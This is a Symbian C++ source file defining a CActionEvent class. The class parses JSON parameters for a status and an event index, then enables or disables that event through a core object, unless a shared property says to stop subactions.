/*
 * ActionEvent.cpp
 *
 *  Created on: 08/feb/2012
 *      Author: Giovanna
 */

#include "ActionEvent.h"

#include "Json.h"

CActionEvent::CActionEvent(TQueueType aQueueType) :
	CAbstractAction(EAction_Event, aQueueType)
	{
	// No implementation required
	}

CActionEvent::~CActionEvent()
	{
	}

CActionEvent* CActionEvent::NewLC(const TDesC8& params, TQueueType aQueueType)
	{
	CActionEvent* self = new (ELeave) CActionEvent(aQueueType);
	CleanupStack::PushL(self);
	self->ConstructL(params);
	return self;
	}

CActionEvent* CActionEvent::NewL(const TDesC8& params, TQueueType aQueueType)
	{
	CActionEvent* self = CActionEvent::NewLC(params, aQueueType);
	CleanupStack::Pop(); // self;
	return self;
	}

void CActionEvent::ConstructL(const TDesC8& params)
	{
		BaseConstructL(params);
		
		//parse params
		
		RBuf paramsBuf;
			
		TInt err = paramsBuf.Create(2*params.Size());
		if(err == KErrNone)
			{
			paramsBuf.Copy(params);
			}
		else
			{
			//TODO: not enough memory
			}
		TBuf<16> status;	
		paramsBuf.CleanupClosePushL();
		CJsonBuilder* jsonBuilder = CJsonBuilder::NewL();
		CleanupStack::PushL(jsonBuilder);
		jsonBuilder->BuildFromJsonStringL(paramsBuf);
		CJsonObject* rootObject;
		jsonBuilder->GetDocumentObject(rootObject);
		if(rootObject)
			{
			CleanupStack::PushL(rootObject);
			//retrieve status: enabled or disabled
			rootObject->GetStringL(_L("status"),status);
			//retrieve event index
			rootObject->GetIntL(_L("event"),iEventIdx);
			CleanupStack::PopAndDestroy(rootObject);
			}

		CleanupStack::PopAndDestroy(jsonBuilder);
		CleanupStack::PopAndDestroy(&paramsBuf);
		
		if(status.Compare(_L("enable")) == 0)
			iEnable = ETrue;
		else
			iEnable = EFalse;
			
	}

void CActionEvent::DispatchStartCommandL()
	{
	TInt value = 0;
	if(iConditioned)
		{
		// we are conditioned by a previous sync, we get the result
		RProperty::Get(KPropertyUidCore, KPropertyStopSubactions,value);
		}
	if(value == 0)
		{
		if(iEnable)
			{
			//enable event
			iCore->EnableEventL(iEventIdx);
			}
		else
			{
			//disable event
			iCore->DisableEventL(iEventIdx);
			}
		}
	MarkCommandAsDispatchedL();
	SetFinishedJob(ETrue);
	}

void CActionEvent::SetCorePointer(CCore* aCore)
	{
	iCore = aCore;
	}
